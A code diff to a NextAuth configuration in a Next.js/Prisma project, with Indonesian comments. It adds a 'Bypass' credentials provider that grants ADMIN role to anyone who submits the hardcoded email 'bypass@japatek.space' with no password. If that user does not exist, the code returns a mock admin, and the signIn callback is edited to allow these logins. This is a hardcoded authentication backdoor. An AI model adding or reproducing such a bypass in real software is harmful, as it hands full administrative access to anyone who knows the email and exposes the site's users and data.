@@ -10,6 +10,7 @@ import NextAuth                     from "next-auth";
 import { PrismaAdapter }            from "@auth/prisma-adapter";
 import Google                       from "next-auth/providers/google";
 import Nodemailer                   from "next-auth/providers/nodemailer";
+import Credentials                  from "next-auth/providers/credentials"; // <-- Ditambahkan
 import type { DefaultSession }      from "next-auth";
 import type { JWT }                 from "next-auth/jwt";
 import type { AdapterUser }         from "next-auth/adapters";
@@ -103,6 +104,41 @@ const config: NextAuthConfig = {
       },
     }),
     emailProvider,
+    
+    // ── Ditambahkan: Credentials Provider untuk fungsi Bypass ──
+    Credentials({
+      id: "credentials",
+      name: "Credentials",
+      credentials: {
+        email: { label: "Email", type: "text" }
+      },
+      async authorize(credentials) {
+        if (credentials?.email === "bypass@japatek.space") {
+          // Cari user di database terlebih dahulu agar ID valid dengan relasi Prisma lainnya
+          const user = await prisma.user.findUnique({
+            where: { email: "bypass@japatek.space" }
+          });
+
+          if (user) {
+            return {
+              id: user.id,
+              name: user.name || "Bypass Admin",
+              email: user.email,
+              role: (user as any).role || "ADMIN", 
+            };
+          }
+
+          // Jika tidak ada di database, gunakan mock user sementara
+          return { 
+            id: "bypass-admin-mock-id", 
+            name: "Admin Bypass", 
+            email: "bypass@japatek.space",
+            role: "ADMIN"
+          };
+        }
+        return null;
+      }
+    })
   ],
 
   cookies: {
@@ -183,6 +219,7 @@ const config: NextAuthConfig = {
     async signIn({ user, account }) {
       if (!user.email) return false;
       if (account?.provider === "google") return true;
+      if (account?.provider === "credentials") return true; // Izinkan bypass credentials
       return true;
     },
   },
